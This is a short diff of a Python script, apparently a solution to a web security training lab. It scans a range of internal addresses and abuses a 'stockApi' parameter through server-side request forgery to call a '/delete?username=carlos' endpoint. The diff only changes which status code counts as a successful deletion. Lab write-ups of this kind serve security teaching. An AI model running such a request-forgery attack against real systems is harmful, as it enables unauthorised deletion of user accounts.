@@ -19,7 +19,7 @@ for i in range(1,256):
         newParm = stock+"/delete?username=carlos"
         res = requests.post(url,data={"stockApi":newParm})
 
-        if(res.status_code == 200):
+        if(res.status_code == 302):
             print("[+] carlos is deleted ...")
         else:
             print(f"[-] didnt delete carlos, got {res.status_code}")
